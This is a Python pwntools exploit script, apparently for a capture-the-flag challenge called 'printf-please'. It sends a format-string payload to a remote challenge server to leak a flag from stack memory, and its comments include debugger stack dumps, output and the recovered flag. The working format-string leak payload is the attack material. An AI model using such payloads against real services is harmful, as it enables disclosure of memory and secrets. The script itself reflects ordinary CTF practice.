from pwn import *
import time
binf = ELF("please")
libc = ELF.libc

'''
main 0x14b5
lectura del 1 fopen = 0x5555555554e3 = 0xfbad2488
0x555555555521 <main+108>    mov    eax, dword ptr [rbp - 0x14] antes de srand
0X133C IN-WHILE
'''

gs = '''
set exception-verbose on
break *0x0000555555555274
break *0x0000555555555298
break *0x555555555279
'''
def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        # return process(binf.path)
        return remote("mc.ax",31569)

# context.log_level = "DEBUG"
context.aslr = False

print(binf.plt)

shell=""
shell=b"flag.txt"



# i=68
# while(i<80):
p=start()
print(p.recvuntil('say?\n'))
# exp='please AAAAAAAA'+'%'+str(72)+'$p'+'%'+str(7)+'$p'+'%'+str(72)+'$p'+'%'+str(73)+'$p'+'%'+str(74)+'$p'+'%'+str(75)+'$p'

exp='please AAAAAAAA'+'%'+str(76)+'$lx'+'%'+str(75)+'$lx'+'%'+str(74)+'$lx'+'%'+str(73)+'$lx'+'%'+str(72)+'$lx'+'%'+str(71)+'$lx'+'%'+str(70)+'$lx'+'%'+str(69)+'$lx'+'%'+str(68)+'$lx'
# exp='please '+'%'+str(72)+'$p'+'%'+str(70)+'$p'+'%'+str(71)+'$p'+'%'+str(73)+'$p'+'%'+str(74)+'$p'+'%'+str(75)+'$p'
p.sendline(exp)
all=p.recvall()
    # if b'flag' in all:
        # print("*************************************************************************\n\n\n")

print()
print(all)
print()
# print("*************************************************************************\n\n\n\n\n\n")
# pause()
p.close()
# i=i+1
# print(p.recvuntil('too!'))

# ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# 00:0000│ rdi rbp rsp rsi-6 0x7fffffffdb30 ◂— 'please AAAAAAAAAAAA'
# pwndbg> stack 60
# 01:0008│                   0x7fffffffdb38 ◂— 'AAAAAAAAAAA'
# 02:0010│                   0x7fffffffdb40 ◂— 0x414141 /* 'AAA' */
# 03:0018│                   0x7fffffffdb48 ◂— 0x0
# ... ↓                      56 skipped
# pwndbg> stack 100
# 00:0000│ rdi rbp rsp rsi-6 0x7fffffffdb30 ◂— 'please AAAAAAAAAAAA'
# 01:0008│                   0x7fffffffdb38 ◂— 'AAAAAAAAAAA'
# 02:0010│                   0x7fffffffdb40 ◂— 0x414141 /* 'AAA' */
# 03:0018│                   0x7fffffffdb48 ◂— 0x0
# ... ↓                      60 skipped
# 40:0200│ r13               0x7fffffffdd30 ◂— 'flag{hola_mundirijillo}\n'
# 41:0208│                   0x7fffffffdd38 ◂— 'a_mundirijillo}\n'
# 42:0210│                   0x7fffffffdd40 ◂— 'ijillo}\n'
# 43:0218│                   0x7fffffffdd48 ◂— 0x0
# ... ↓                      32 skipped


# pwndbg> stack 80
# 00:0000│ rdx rsp         0x7fffffffda70 —▸ 0x7ffff7fcf9c1 ◂— '_dl_catch_error'
# 01:0008│                 0x7fffffffda78 —▸ 0x7fffffffdb50 ◂— 'please %p %p %p %p '
# 02:0010│                 0x7fffffffda80 ◂— 0x19dfe69
# 03:0018│                 0x7fffffffda88 ◂— 0x46c8c095d8d72900
# 04:0020│ rax             0x7fffffffda90 ◂— 0x0
# 05:0028│                 0x7fffffffda98 —▸ 0x7fffffffdb56 ◂— ' %p %p %p %p '                                                              <<< |1| ********
# 06:0030│                 0x7fffffffdaa0 ◂— 0x1                                                                                            <<< |2| ********
# 07:0038│                 0x7fffffffdaa8 ◂— 0x0
# 08:0040│                 0x7fffffffdab0 —▸ 0x555555556010 ◂— 't do you say?'
# 09:0048│                 0x7fffffffdab8 —▸ 0x7ffff7fe0d50 ◂— endbr64                                                                       <<< |5| ********
# 0a:0050│                 0x7fffffffdac0 ◂— 0xd68 /* 'h\r' */
# 0b:0058│                 0x7fffffffdac8 ◂— 0xa /* '\n' */
# 0c:0060│                 0x7fffffffdad0 —▸ 0x7ffff7faf6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
# 0d:0068│                 0x7fffffffdad8 —▸ 0x55555555600d ◂— 'what do you say?'
# 0e:0070│                 0x7fffffffdae0 —▸ 0x555555558020 (stdout@@GLIBC_2.2.5) —▸ 0x7ffff7faf6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
# 0f:0078│                 0x7fffffffdae8 —▸ 0x7ffff7fb04a0 (_IO_file_jumps) ◂— 0x0
# 10:0080│                 0x7fffffffdaf0 ◂— 0x0
# 11:0088│                 0x7fffffffdaf8 —▸ 0x7ffff7e57013 (_IO_file_overflow+275) ◂— cmp    eax, -1
# 12:0090│                 0x7fffffffdb00 ◂— 0x10
# 13:0098│                 0x7fffffffdb08 —▸ 0x7ffff7faf6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
# 14:00a0│                 0x7fffffffdb10 —▸ 0x55555555600d ◂— 'what do you say?'
# 15:00a8│                 0x7fffffffdb18 —▸ 0x7ffff7e4a71a (puts+378) ◂— cmp    eax, -1
# 16:00b0│                 0x7fffffffdb20 —▸ 0x5555555553a0 (__libc_csu_init) ◂— endbr64 
# 17:00b8│                 0x7fffffffdb28 —▸ 0x7fffffffdb50 ◂— 'please %p %p %p %p '
# 18:00c0│                 0x7fffffffdb30 ◂— 0x3
# 19:00c8│                 0x7fffffffdb38 —▸ 0x7fffffffdd50 ◂— 'flag{hola_mundirijillo}\n'
# 1a:00d0│                 0x7fffffffdb40 ◂— 0x0
# 1b:00d8│                 0x7fffffffdb48 —▸ 0x555555555279 (main+281) ◂— lea    rdi, [rip + 0xda7]                               <<< || ********
# 1c:00e0│ rdi rsi r10 rbp 0x7fffffffdb50 ◂— 'please %p %p %p %p '                                                                     <<< |6| ********
# 1d:00e8│                 0x7fffffffdb58 ◂— 'p %p %p %p '                                                                          <<< |9| ********
# 1e:00f0│                 0x7fffffffdb60 ◂— 0x207025 /* '%p ' */                                                                      <<< |10| ********
# 1f:00f8│                 0x7fffffffdb68 ◂— 0x0
# ... ↓                    48 skipped

# please          0x555555556028 'to you too!'
# please          0x555555557028 'to you too!'

# web_testing@WebTesting:/media/sf_PwnLin/printf-please$ python3 exploit.py | grep 7269646e756d5f61
# 71 b'please AAAAAAAA0x7269646e756d5f61 $p $p $p $p $p $p $p $p $p  to you too!\n'


# b'what do you say?\n'
# [+] Receiving all data: Done (109B)
# [*] Closed connection to mc.ax port 31569

# b'please AAAAAAAA00a7d6c783361395f6e3031747561635f687431775f66746e3172705f337361336c707b67616c6600 to you too!\n'


# pl3as3_pr1ntf_w1th_caut10n_9a3xl